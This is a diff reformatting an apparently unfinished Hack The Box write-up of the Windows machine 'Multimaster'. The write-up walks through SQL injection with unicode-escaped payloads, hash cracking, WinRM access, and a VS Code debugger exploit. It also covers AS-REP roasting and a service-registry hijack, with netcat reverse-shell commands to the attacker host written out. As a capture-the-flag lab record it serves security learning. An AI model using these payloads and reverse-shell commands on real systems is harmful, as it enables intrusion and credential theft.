@@ -2,20 +2,14 @@
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/a55380d2dee86d146756fec4129a3b5b24656dc1/windows-machines/insane/machine%3E.infocard.png)
 
-Hold on to your seats, because this Insane Windows machine is a wild ride.
-TODO:Finish this writeup, there are more notes and stuff in the notes app if anything is missing...
+Hold on to your seats, because this Insane Windows machine is a wild ride. TODO:Finish this writeup, there are more notes and stuff in the notes app if anything is missing...
 
 ## Useful Skills and Tools
 
-#### <Useful thing 1>
-
-- description with generic example
-
-#### <Useful thing 2>
-
-- description with generic example
+* description with generic example
+* description with generic example
 
 ## Enumeration
 
@@ -23,9 +17,9 @@ TODO:Finish this writeup, there are more notes and stuff in the notes app if any
 
 I started my enumeration with an nmap scan of `10.10.10.179`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
 
-At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally. 
+At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.
 
-```
+```text
 zweilos@kalimaa:~/htb/multimaster$ nmap -p- -sC -sV -oN multimaster.nmap 10.10.10.179 -Pn
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 12:17 EDT
 Nmap scan report for 10.10.10.179
@@ -111,7 +105,7 @@ Nmap done: 1 IP address (1 host up) scanned in 486.11 seconds
 
 lots of ports open
 
-```
+```text
 rpcclient $> lsaquery
 Domain Name: MEGACORP
 Domain Sid: S-1-5-21-3167813660-1240564177-918740779
@@ -119,7 +113,7 @@ Domain Sid: S-1-5-21-3167813660-1240564177-918740779
 
 Capturing the burp request to the `/api/get/Colleagues`
 
-```
+```text
 POST /api/getColleagues HTTP/1.1
 Host: 10.10.10.179
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -135,10 +129,9 @@ DNT: 1
 {"name":"\u0061\u0027\u0020\u006F\u0072\u0020\u0031\u003D\u0031\u003B\u0020\u002D\u002D"}
 ```
 
-This is the unicode escaped equivilent of `a' or 1=1; --`
-And the response:
+This is the unicode escaped equivilent of `a' or 1=1; --` And the response:
 
-```
+```text
 HTTP/1.1 200 OK
 Cache-Control: no-cache
 Pragma: no-cache
@@ -156,7 +149,7 @@ Content-Length: 1821
 
 next attempted to enumerate the valid users who have active accounts on this machine through Kerberos.
 
-```
+```text
 zweilos@kalimaa:~/htb/multimaster$ python3 /home/zweilos/impacket/examples/GetNPUsers.py -outputfile multimaster.hash -format hashcat -usersfile /home/zweilos/htb/multimaster/users -no-pass -dc-ip 10.10.10.179 MEGACORP/egre55
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
@@ -178,26 +171,14 @@ Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 ```
-used [wafw00f](https://github.com/enablesecurity/wafw00f) to detect if there was a WAF, but none was detected
-https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/
-https://github.com/0xInfection/Awesome-WAF#testing-methodology
-https://github.com/sqlmapproject/sqlmap/blob/master/tamper/charunicodeescape.py
 
-mine
-https://stackoverflow.com/questions/40628603/sqlmap-post-json-data-as-body
-https://www.yg.ht/blog/blog/archives/361/getting-sqlmap-to-detect-injection-points-through-json
-sqlmap -r burppost —tamper charunicodetamper.py —dbs -delay 5
-sqlmap -r burppost —tamper charunicodetamper.py —D Hub_DB -tables -delay 5
-sqlmap will automatically detect that there is JSON data in your POST and will ask if you would like for it to process it.
-sqlmap called hash sha384_generic_passwd
-https://www.tunnelsup.com/hash-analyzer/ verified that the hash was sha2-384
-There were duplicates of each hash, only four unique; 
+used [wafw00f](https://github.com/enablesecurity/wafw00f) to detect if there was a WAF, but none was detected [https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/](https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/) [https://github.com/0xInfection/Awesome-WAF\#testing-methodology](https://github.com/0xInfection/Awesome-WAF#testing-methodology) [https://github.com/sqlmapproject/sqlmap/blob/master/tamper/charunicodeescape.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/charunicodeescape.py)
 
-hashcat -m 10800 -a 0 -o hash.cracked hash /usr/share/wordlists/rockyou.txt
-Possible algorithms: Keccak-384
+mine [https://stackoverflow.com/questions/40628603/sqlmap-post-json-data-as-body](https://stackoverflow.com/questions/40628603/sqlmap-post-json-data-as-body) [https://www.yg.ht/blog/blog/archives/361/getting-sqlmap-to-detect-injection-points-through-json](https://www.yg.ht/blog/blog/archives/361/getting-sqlmap-to-detect-injection-points-through-json) sqlmap -r burppost —tamper charunicodetamper.py —dbs -delay 5 sqlmap -r burppost —tamper charunicodetamper.py —D Hub\_DB -tables -delay 5 sqlmap will automatically detect that there is JSON data in your POST and will ask if you would like for it to process it. sqlmap called hash sha384\_generic\_passwd [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/) verified that the hash was sha2-384 There were duplicates of each hash, only four unique;
 
+hashcat -m 10800 -a 0 -o hash.cracked hash /usr/share/wordlists/rockyou.txt Possible algorithms: Keccak-384
 
-```
+```text
 zweilos@kalimaa:~/htb/multimaster$hashcat -m 17900 -a 0 -o hash.cracked hash /usr/share/wordlists/rockyou.txt
 snipped...
 
@@ -223,22 +204,18 @@ Stopped: Mon Jul 20 19:17:57 2020
 
 Hashcat was able to crack 3 out of 4 of the hashes
 
-```
+```text
 zweilos@kalimaa:~/htb/multimaster$ cat hash.cracked 
 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
 fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
 ```
 
-Just because the usernames I got were in the database does not mean they can login to this machine.  Maybe need to enumerate users from the  the domain in another way since ldap and rpc were not helpful
-https://kalilinuxtutorials.com/mssql-injection
-https://github.com/Keramas/mssqli-duet
-https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/
+Just because the usernames I got were in the database does not mean they can login to this machine. Maybe need to enumerate users from the the domain in another way since ldap and rpc were not helpful [https://kalilinuxtutorials.com/mssql-injection](https://kalilinuxtutorials.com/mssql-injection) [https://github.com/Keramas/mssqli-duet](https://github.com/Keramas/mssqli-duet) [https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/](https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/)
 
-https://www.sqlservercentral.com/forums/topic/how-to-retrieve-active-directory-user-information-through-sql-server`' -- exec xp_cmdshell 'net group /domain'` returns same list as earlier user enumeration
+[https://www.sqlservercentral.com/forums/topic/how-to-retrieve-active-directory-user-information-through-sql-server\`](https://www.sqlservercentral.com/forums/topic/how-to-retrieve-active-directory-user-information-through-sql-server`)' -- exec xp\_cmdshell 'net group /domain'\` returns same list as earlier user enumeration
 
-
-```
+```text
 USERS list
 james
 dai
@@ -262,7 +239,7 @@ nPourne
 
 from enum4linux
 
-```
+```text
  =========================================== 
 |    Getting domain SID for 10.10.10.179    |
  =========================================== 
@@ -272,15 +249,11 @@ Domain Sid: S-1-5-21-3167813660-1240564177-918740779
 [+] Host is part of a domain (not a workgroup)
 ```
 
-https://devblogs.microsoft.com/oldnewthing/20040315-00/?p=40253
-https://froosh.wordpress.com/2005/10/21/hex-sid-to-decimal-sid-translation/
-SID in HEX `0x0105000000000005150000001C00D1BCD181F1492BDFC23600020000`
+[https://devblogs.microsoft.com/oldnewthing/20040315-00/?p=40253](https://devblogs.microsoft.com/oldnewthing/20040315-00/?p=40253) [https://froosh.wordpress.com/2005/10/21/hex-sid-to-decimal-sid-translation/](https://froosh.wordpress.com/2005/10/21/hex-sid-to-decimal-sid-translation/) SID in HEX `0x0105000000000005150000001C00D1BCD181F1492BDFC23600020000`
 
-https://securityonline.info/mssqli-duet-sql-injection-script-for-mssql/
-https://github.com/Keramas/mssqli-duet
+[https://securityonline.info/mssqli-duet-sql-injection-script-for-mssql/](https://securityonline.info/mssqli-duet-sql-injection-script-for-mssql/) [https://github.com/Keramas/mssqli-duet](https://github.com/Keramas/mssqli-duet)
 
-
-https://translate.google.com/translate?hl=en&sl=ru&u=https://lolz.guru/threads/1537485/&prev=search&pto=aue
+[https://translate.google.com/translate?hl=en&sl=ru&u=https://lolz.guru/threads/1537485/&prev=search&pto=aue](https://translate.google.com/translate?hl=en&sl=ru&u=https://lolz.guru/threads/1537485/&prev=search&pto=aue)
 
 ```python
 #! / usr / bin / env python
@@ -334,7 +307,7 @@ if __name__ == "__main__":
                 print colored ("[+] Pyload:" + payload, "green")
                 #print colored ("[+] Encoded payload:" + format (encpayload), "green")
                 print colored ("\ n" + r.text, "yellow")
- 
+
             jsona = json.loads (r.text)
             if jsona:
                 try:
@@ -352,7 +325,6 @@ if __name__ == "__main__":
                 if "\\" in r.text:
                     print colored (data + "\ n", "yellow")
             i + = 1
-
 ```
 
 ## Initial Foothold
@@ -363,7 +335,7 @@ if __name__ == "__main__":
 
 ### Finding user creds
 
-```
+```text
 zweilos@kalimaa:~/htb/multimaster$ evil-winrm -u tushikikatomo -i 10.10.10.179 -p finance1
 
 Evil-WinRM shell v2.3
@@ -373,10 +345,9 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\alcibiades\Documents>
 ```
 
-
 ### User.txt
 
-```
+```text
 *Evil-WinRM* PS C:\Users\alcibiades\Desktop> cat user.txt
 6043eb65fb46ebf347fa4c1fe9584a2f
 ```
@@ -384,7 +355,8 @@ Info: Establishing connection to remote endpoint
 ## Path to Power \(Gaining Administrator Access\)
 
 ### Enumeration as User `tushikikatomo`
-```
+
+```text
 *Evil-WinRM* PS C:\Users\alcibiades\Desktop> whoami /all
 
 USER INFORMATION
@@ -431,7 +403,7 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 User folders on this box include:
 
-```
+```text
 *Evil-WinRM* PS C:\Users> ls
 
 
@@ -452,11 +424,11 @@ d-----         1/9/2020   5:12 PM                sbauer
 d-----         3/7/2020   8:38 AM                SQLTELEMETRY
 ```
 
-https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/
+[https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/](https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/)
 
-```
+```text
 *Evil-WinRM* PS C:\> net users /domain
-     
+
 User accounts for \\                                                                                 -------------------------------------------------------------------------------                         
 Administrator            aldom                    alice
 alyx                     andrew                   ckane
@@ -470,7 +442,7 @@ tushikikatomo            zac                      zpowers
 The command completed with one or more errors.
 ```
 
-```
+```text
 *Evil-WinRM* PS C:\Users\alcibiades\Documents> net group /domain
 
 Group Accounts for \\
@@ -499,7 +471,7 @@ The command completed with one or more errors.
 
 text
 
-```
+```text
 *Evil-WinRM* PS C:\Users\alcibiades\Documents> net group 'Developers'
 Group name     Developers
 Comment
@@ -512,9 +484,9 @@ sbauer
 The command completed successfully.
 ```
 
-https://activedirectorypro.com/powershell-commands/
+[https://activedirectorypro.com/powershell-commands/](https://activedirectorypro.com/powershell-commands/)
 
-```
+```text
 *Evil-WinRM* PS C:\Users\alcibiades\Documents> Get-Process
 
 Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
@@ -584,37 +556,28 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 
 text
 
-```
+```text
 *Evil-WinRM* PS C:\Program Files\Microsoft VS Code\resources\app> more package.json
 {
   "name": "Code",
   "version": "1.37.1",
 ```
 
-https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1414
+[https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1414](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1414)
 
-> An elevation of privilege vulnerability exists in Visual Studio Code when it exposes a debug listener to users of a local computer. A local attacker who successfully exploited the vulnerability could inject arbitrary code to run in the context of the current user. If the current user is logged on with administrative user rights, an attacker could take control of the affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.
-> To exploit this vulnerability, a local attacker would need to determine which port Visual Studio Code is listening on for a targeted user.
+> An elevation of privilege vulnerability exists in Visual Studio Code when it exposes a debug listener to users of a local computer. A local attacker who successfully exploited the vulnerability could inject arbitrary code to run in the context of the current user. If the current user is logged on with administrative user rights, an attacker could take control of the affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. To exploit this vulnerability, a local attacker would need to determine which port Visual Studio Code is listening on for a targeted user.
 
 ### Moving to user2
 
-each site leads to next :
-https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-1414
-https://github.com/qazbnm456/awesome-cve-poc
-https://github.com/nu11secur1ty/Exp101tsArchiv30thers
-https://iwantmore.pizza/posts/cve-2019-1414.html
+each site leads to next : [https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-1414](https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-1414) [https://github.com/qazbnm456/awesome-cve-poc](https://github.com/qazbnm456/awesome-cve-poc) [https://github.com/nu11secur1ty/Exp101tsArchiv30thers](https://github.com/nu11secur1ty/Exp101tsArchiv30thers) [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
 
-> Exploitation
-> There are two main limitations to the exploitability, that are:
-> 1. the debug port binds to 127.0.0.1
-> 2. a random TCP port is used every execution
+> Exploitation There are two main limitations to the exploitability, that are: 1. the debug port binds to 127.0.0.1 2. a random TCP port is used every execution
+>
+> Due to these limitations, the issue cannot be remotely exploited. If instead a fixed TCP port was used, the issue could have been exploited via the browser using a DNS Rebinding attack to bypass the Same Origin Policy. To be able to execute arbitary JavaScript code, we need first to retrieve the WebSocket link using a HTTP GET request to /json URL and then connect to it using the WebSocket protocol.
 
-> Due to these limitations, the issue cannot be remotely exploited. If instead a fixed TCP port was used, the issue could have been exploited via the browser using a DNS Rebinding attack to bypass the Same Origin Policy.
-> To be able to execute arbitary JavaScript code, we need first to retrieve the WebSocket link using a HTTP GET request to /json URL and then connect to it using the WebSocket protocol.
+[https://github.com/phra/inspector-exploiter](https://github.com/phra/inspector-exploiter)
 
-https://github.com/phra/inspector-exploiter
-
-```
+```text
 *Evil-WinRM* PS C:\Program Files\Microsoft VS Code\bin> more code.cmd
 @echo off
 setlocal
@@ -626,7 +589,7 @@ endlocal
 
 text
 
-```
+```text
 *Evil-WinRM* PS C:\Program Files\Microsoft VS Code\bin> more ../\resources\app\out\cli.js
 /*---------------------------------------------------------------------------------------------
  *  Copyright (c) Microsoft Corporation. All rights reserved.
@@ -635,9 +598,10 @@ text
 "use strict";const bootstrap=require("./bootstrap");bootstrap.avoidMonkeyPatchFromAppInsights(),bootstrap.configurePortable(),bootstrap.enableASARSupport(),require("./bootstrap-amd").load("vs/code/node/cli");
 //# sourceMappingURL=https://ticino.blob.core.windows.net/sourcemaps/f06011ac164ae4dc8e753a3fe7f9549844d15e35/core/cli.js.map
 ```
+
 text
 
-```
+```text
 *Evil-WinRM* PS C:\Program Files\Microsoft VS Code\bin> ./code --inspect
 code.cmd : Debugger listening on ws://127.0.0.1:9229/a377826b-0406-4fce-8a79-41ac482f80fb
     + CategoryInfo          : NotSpecified: (Debugger listen...79-41ac482f80fb:String) [], RemoteException
@@ -647,7 +611,7 @@ For help, see: https://nodejs.org/en/docs/inspector
 
 text
 
-```
+```text
 *Evil-WinRM* PS C:\Users\alcibiades> ./c.exe
 c.exe : [2020/07/24 07:42:30:1971] U: There are 3 tcp sockets in state listen.
     + CategoryInfo          : NotSpecified: ([2020/07/24 07:...n state listen.:String) [], RemoteException
@@ -658,7 +622,7 @@ c.exe : [2020/07/24 07:42:30:1971] U: There are 3 tcp sockets in state listen.
 
 had to keep starting over again as the CEF debug server kept changing
 
-```
+```text
 *Evil-WinRM* PS C:\Users\alcibiades> C:\Users\alcibiades\c.exe --url ws://127.0.0.1:7437/68e9868e-29b8-48fc-9612-8be4aea95ccd --code "process.mainModule.require('child_process').exec('cmd.exe /c C:\Users\alcibiades\nc.exe 10.10.15.57 4445 -e cmd.exe')"
 c.exe : [2020/07/24 07:44:55:7426] U: >>> process.mainModule.require('child_process').exec('cmd.exe /c C:\Users\alcibiades\nc.exe 10.10.15.57 4445 -e cmd.exe')
     + CategoryInfo          : NotSpecified: ([2020/07/24 07:...45 -e cmd.exe'):String) [], RemoteException
@@ -668,7 +632,7 @@ c.exe : [2020/07/24 07:44:55:7426] U: >>> process.mainModule.require('child_proc
 
 ### Moving laterally to user - `cyork`
 
-```
+```text
 *Evil-WinRM* PS C:\Users\cyork\Documents> whoami /all
 
 USER INFORMATION
@@ -723,19 +687,18 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 while searching around I cound that I had access to a folder I didn't before...the `wwwroot\` folder in `C:\inetpub\`
 
-```
+```text
 *Evil-WinRM* PS C:\inetpub\wwwroot> more index.html
 <!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=icon href=/favicon.ico><title>MegaCorp</title><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900"><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@mdi/font@latest/css/materialdesignicons.min.css><link href=/js/about.893bb588.js rel=prefetch><link href=/css/app.90380d45.css rel=preload as=style><link href=/css/chunk-vendors.11727d04.css rel=preload as=style><link href=/js/app.eeb965b5.js rel=preload as=script><link href=/js/chunk-vendors.ae41a8ca.js rel=preload as=script><link href=/css/chunk-vendors.11727d04.css rel=stylesheet><link href=/css/app.90380d45.css rel=stylesheet></head><body><noscript><strong>We're sorry but multimaster doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id=app></div><script src=/js/chunk-vendors.ae41a8ca.js></script><script src=/js/app.eeb965b5.js></script></body></html>
 ```
 
 > We're sorry but multimaster doesn't work properly without JavaScript enabled. Please enable it to continue.
 
-https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell
-`ls -R|?{$_|Select-String 'dummy'}|%{$_.FullName;gc $_}`
+[https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell](https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell) `ls -R|?{$_|Select-String 'dummy'}|%{$_.FullName;gc $_}`
 
 Running the command `*Evil-WinRM* PS C:\inetpub\wwwroot\bin> type MultimasterAPI.dll` results in:
 
-```
+```text
 IndexDefaultApi+api/{controller}/{id}%/api/getColleagues
                                                              UNION
 SELECT  JOINALL EXEC'
@@ -749,10 +712,9 @@ MASTER7{ "info" : "MegaCorp API" }!application/json€…server=localhost;databa
 
 `ls -R -EA SilentlyContinue|?{$_|Select-String 'password'}|%{$_.FullName;}`
 
-
 ### Moving laterally to user3 - `sbauer`
 
-```
+```text
 zweilos@kalimaa:~/htb/multimaster$ crackmapexec smb -u users -p passwords -d MEGACORP 10.10.10.179
 SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP) (signing:True) (SMBv1:True)
 SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\shayna:password1 STATUS_LOGON_FAILURE 
@@ -767,31 +729,28 @@ SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\sbauer:banking1
 SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP\sbauer:D3veL0pM3nT!
 ```
 
-I found a password for yet again another user: this time `sbauer`.  Accordeing to my searches with Bloodhoud earlier, `jorden` should be next, then `Administrator`.  we will see if my projected path from this user was correct.
+I found a password for yet again another user: this time `sbauer`. Accordeing to my searches with Bloodhoud earlier, `jorden` should be next, then `Administrator`. we will see if my projected path from this user was correct.
 
-> GenericWrite
-> Generic Write access grants you the ability to **write to any non-protected attribute on the target object**, including “members” for a group, and “**serviceprincipalnames**” for a user
-> Abuse Info
-> Users
-> With GenericWrite over a user, **perform a targeted kerberoasting attack**. See the abuse section under the GenericAll edge for more information
+> GenericWrite Generic Write access grants you the ability to **write to any non-protected attribute on the target object**, including “members” for a group, and “**serviceprincipalnames**” for a user Abuse Info Users With GenericWrite over a user, **perform a targeted kerberoasting attack**. See the abuse section under the GenericAll edge for more information
 
-The following video explains how to exploit this: https://www.youtube.com/watch?v=z8thoG7gPd0 
+The following video explains how to exploit this: [https://www.youtube.com/watch?v=z8thoG7gPd0](https://www.youtube.com/watch?v=z8thoG7gPd0)
 
-http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/
+[http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/](http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/)
 
 > we can change a victim’s userAccountControl to not require Kerberos preauthentication, grab the user’s crackable AS-REP, and then change the setting back:
 
-https://docs.microsoft.com/en-us/powershell/module/addsadministration/set-adaccountcontrol?view=win10-ps
+[https://docs.microsoft.com/en-us/powershell/module/addsadministration/set-adaccountcontrol?view=win10-ps](https://docs.microsoft.com/en-us/powershell/module/addsadministration/set-adaccountcontrol?view=win10-ps)
 
-Set-ADAccountControl -DoesNotRequirePreAuth <Boolean>
-> -DoesNotRequirePreAuth
-Indicates whether Kerberos pre-authentication is required to logon using the user or computer account. This parameter sets the ADS_UF_DONT_REQUIRE_PREAUTH flag of the Active Directory UAC attribute. The acceptable values for this parameter are:
-> - $False or 0
-> - $True or 1
+Set-ADAccountControl -DoesNotRequirePreAuth 
+
+> -DoesNotRequirePreAuth Indicates whether Kerberos pre-authentication is required to logon using the user or computer account. This parameter sets the ADS\_UF\_DONT\_REQUIRE\_PREAUTH flag of the Active Directory UAC attribute. The acceptable values for this parameter are:
+>
+> * $False or 0
+> * $True or 1
 
 Then we can use Impacket's GETSPNUSers.py
 
-```
+```text
 zweilos@kalimaa:~/htb/multimaster$ evil-winrm -u sbauer -i 10.10.10.179 -p D3veL0pM3nT!
 
 Evil-WinRM shell v2.3
@@ -844,9 +803,10 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
 ### Moving from `sbauer` to `jorden`
+
 `*Evil-WinRM* PS C:\inetpub> Set-ADAccountControl -DoesNotRequirePreAuth $True jorden`
 
-```
+```text
 zweilos@kalimaa:~/.local/bin$ python3 GetNPUsers.py -format hashcat -usersfile /home/zweilos/htb/multimaster/users -debug -dc-ip 10.10.10.179 MEGACORP/sbauer:D3veL0pM3nT!
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
@@ -915,7 +875,7 @@ $krb5asrep$23$jorden@MEGACORP:1056ca13b19833bd5ae1152f9fe42b5c$112eb867bb4c8c065
 
 the password cracked very quickly
 
-```
+```text
 zweilos@kalimaa:~/htb/multimaster$ hashcat -m 18200 -a 0 jorden.hash ~/rockyou.txt
 hashcat (v6.0.0) starting...
 Dictionary cache built:
@@ -926,7 +886,7 @@ Dictionary cache built:
 * Runtime...: 2 secs
 
 $krb5asrep$23$jorden@MEGACORP:1056ca13b19833bd5ae1152f9fe42b5c$112eb867bb4c8c06593c39d27e4ca1167692f7f061691c45cd1825291fd3ae9a7b8130e239d076b0f928fc42e7d683444cb8b3124d54711fbd72278e24cf75f5bd08351fc4b63e43ae9e5affac8b6b702eef582c720ed88855e6c9a6ac41ebe7b5b86fb4043f607a6d4a090022c471183e812d08501d49ae1d2f1c62d35816e95c98437d54e396a1b680b7836a6cad4c3af218d25187bd3ac4df45ffbc13359d7b952b7d841a89ac7a1c8c16ce5625dc03212af744371cb24c611c9ddf0da4c3de5740ea9cdaf09e113d23e9969d4107be3ecc2ceeed48f274f95e5d108ff504fe527ff86a71606d38f5:rainforest786
-                                                 
+
 Session..........: hashcat
 Status...........: Cracked
 Hash.Name........: Kerberos 5, etype 23, AS-REP
@@ -949,7 +909,7 @@ Stopped: Fri Jul 24 20:36:44 2020
 
 the user `jorden`'s password was `rainforest786`
 
-```
+```text
 *Evil-WinRM* PS C:\Users\jorden\Documents> whoami /all
 
 USER INFORMATION
@@ -1002,13 +962,13 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-This user has backup and restore privileges, which if I remember correctly is a quick and easy path to escalate privileges "This privilege causes the system to grant all read access control to any file (only read)."
+This user has backup and restore privileges, which if I remember correctly is a quick and easy path to escalate privileges "This privilege causes the system to grant all read access control to any file \(only read\)."
 
-https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf
+[https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea\_Pierini-Whoami\_Priv\_Show\_Me\_Your\_Privileges\_And\_I\_Will\_Lead\_You\_To\_System.pdf](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf)
 
->If you have SeBackup& SeRestoreprivileges(Backup Operators group) you can set permissio nand ownership on each file & folder =WIN!
+> If you have SeBackup& SeRestoreprivileges\(Backup Operators group\) you can set permissio nand ownership on each file & folder =WIN!
 
-```
+```text
 *Evil-WinRM* PS C:\Users\jorden\Documents> $user = MEGACORP\jorden
 The module 'MEGACORP' could not be loaded. For more information, run 'Import-Module MEGACORP'.
 At line:1 char:9
@@ -1046,15 +1006,13 @@ At line:1 char:12
 +            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodException
     + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewObjectCommand
-
 ```
 
 Make sure not to have any spaces between words in your command!
-    
+
 ### Root.txt
 
-
-```
+```text
 *Evil-WinRM* PS C:\> $aclperms = $user, "FullControl", "ContainerInherit, ObjectInherit","None","Allow"
 *Evil-WinRM* PS C:\> $aclrule = New-Object System.Security.AccessControl.FileSystemAccessRule $aclperms
 *Evil-WinRM* PS C:\> $acl.AddAccessRule($aclrule)
@@ -1112,9 +1070,9 @@ fe237d93abd456b96a363e2ed34fb271
 
 ### Getting Administrator Shell
 
-So now I have successfully exfiltrated the secret documents...but I want to own the system.  Time to practice some more privilege escalation.  
+So now I have successfully exfiltrated the secret documents...but I want to own the system. Time to practice some more privilege escalation.
 
-```
+```text
 *Evil-WinRM* PS C:\Users\jorden\Documents> $folder = "C:\Windows\NTDS"
 *Evil-WinRM* PS C:\Users\jorden\Documents> $acl = Get-ACL $folder
 *Evil-WinRM* PS C:\Users\jorden\Documents> $user = "MEGACORP\jorden"
@@ -1138,20 +1096,17 @@ Audit  :
 Sddl   : O:BAG:DUD:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;FA;;;SY)(A;CI;0x100004;;;LS)(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;OICI;FA;;;S-1-5-21-3167813660-1240564177-918740779-3110)
 ```
 
-I'm sure there is a way I can backup ntds.dit
-From https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers:
-But it seems like I need an admin prompt for this to work
+I'm sure there is a way I can backup ntds.dit From [https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers): But it seems like I need an admin prompt for this to work
 
-https://decoder.cloud/2018/02/12/the-power-of-backup-operatos/
+[https://decoder.cloud/2018/02/12/the-power-of-backup-operatos/](https://decoder.cloud/2018/02/12/the-power-of-backup-operatos/)
 
-
-```
+```text
 REG add HKLM\System\CurrentControlSet\Services\WpnUserService_64360ac /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\Documents\nc.exe 10.10.15.57 12345 -e cmd.exe" /f
 ```
 
-Upload nc.exe, then start the service with `sc.exe start <service>`.  
+Upload nc.exe, then start the service with `sc.exe start <service>`.
 
-```
+```text
 *Evil-WinRM* PS C:\Users\jorden\Documents> sc.exe start WerSvc
 [SC] StartService FAILED 1053:
 
@@ -1207,9 +1162,9 @@ The specified service does not exist as an installed service.
 The service did not respond to the start or control request in a timely fashion.
 ```
 
-I had to try many services until I found one that would work.  Even then, it said it failed to start the service, but I got my shell!
+I had to try many services until I found one that would work. Even then, it said it failed to start the service, but I got my shell!
 
-```
+```text
 zweilos@kalimaa:~/htb/multimaster$ nc -lvnp 12345
 listening on [any] 12345 ...
 connect to [10.10.15.57] from (UNKNOWN) [10.10.10.179] 49763
@@ -1290,9 +1245,7 @@ limbernie
 
 ### Finale
 
-
-
-MinatoTW & egre55 
-Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for <something interesting or useful about this machine>.
+MinatoTW & egre55 Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for .
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
+
